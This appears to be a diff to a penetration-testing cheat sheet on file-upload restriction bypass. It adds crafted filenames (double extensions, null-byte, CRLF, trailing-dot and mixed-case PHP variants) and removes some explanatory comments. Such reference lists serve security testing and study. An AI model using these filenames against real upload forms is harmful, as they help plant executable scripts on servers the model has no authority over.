@@ -90,6 +90,12 @@
 file.jpg.php
 file.php.jpg
 file.php.blah123jpg
+file.png.php
+file.png.Php5
+file.php%00.png
+file.php%0d%0a.png
+file.php%0a.png
+file.php\x00.png
 ```
 
 ### Null byte
@@ -106,14 +112,16 @@ file.php\x00.jpg
 ### Special characters
 
 ```bash
-#In Windows when a file is created with dots at the end those will be removed
 file.php......
-
-#Whitespace characters
 file.php%20
-
-#Right ot Left Override
-file.%E2%80%AEphp.jpg #Will became file.gpj.php
+file.php%0a
+file.php%00
+file.php%0d%0a
+file.php/
+file.php.\
+file.
+file.pHp5....
+file.%E2%80%AEphp.jpg
 ```
 
 ### Content-type Bypass
